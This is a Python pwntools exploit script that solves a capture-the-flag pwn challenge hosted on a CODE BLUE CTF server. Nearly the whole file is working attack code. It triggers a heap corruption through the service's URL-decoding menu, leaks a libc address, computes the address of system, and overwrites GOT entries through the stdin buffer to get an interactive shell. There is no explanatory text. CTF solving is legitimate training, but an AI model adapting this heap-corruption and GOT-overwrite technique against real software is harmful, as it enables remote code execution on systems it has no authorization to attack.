from skel import *

me['r']['tube'] = lambda: remote(host='nonamestill.tasks.ctf.codeblue.jp', port=8369)

context.arch = 'i386'

s = tube()

def cr(url, sz = None):
    if sz is None:
        sz = len(url)

    s.sla('> ', '1')
    s.sla('size: ', str(sz))
    s.sa('URL: ', url)

def dec(idx):
    s.sla('> ', '2')
    s.sla('index: ', str(idx))

def li():
    s.sla('> ', '3')
    ret = s.ru('END\n')

    return [x.split(': ') for x in ret.split('LIST START\n')[1].split('LIST END\n')[0].strip().split("\n")]

def de(idx):
    s.sla('> ', '4')
    s.sla('index: ', str(idx))


cr("a", 2)
cr("0"*6+'%', 8)
cr(p32(0x804b05c) + '\n', 0x2530 - 8)
dec(1)

libc_leak = u32(li()[-1][1])
libc_base = libc_leak - 0x001b05a0
system_addr = libc_base + 0x0003a940

print hex(libc_leak), hex(libc_base)

bin_elf = ELF("bin")
stdin_buf_base = libc_leak + 28 # 0x1b25bc

cr("C"*6+'%', 8)
cr(p32(stdin_buf_base) + '\n', 0x2540 - 8)
cr("D\n", 3)

dec(2)

s.send("1\n5\n")
s.ru("URL: ")

# send data + delete cmd to stdin buf
s.send(p32(bin_elf.got['setbuf']) + "4\n4\n")

pay = flat([
    bin_elf.plt['setbuf']+6,
    bin_elf.plt['printf']+6,
    bin_elf.plt['free']+6,
    bin_elf.plt['fgets']+6,
    bin_elf.plt['islower']+6,
    0,
    bin_elf.plt['malloc']+6,
    bin_elf.plt['puts']+6,
    0, # gmon_start
    bin_elf.plt['exit']+6,
    bin_elf.plt['strchr']+6,
    0, # libc_start_main
    system_addr, # bin_elf.plt['__isoc99_sscanf']+6,
    bin_elf.plt['memset']+6,
    bin_elf.plt['toupper']+6,
])
s.send(pay+'\n')
s.rr(0.5)
s.sendline('sh')

s.interactive()
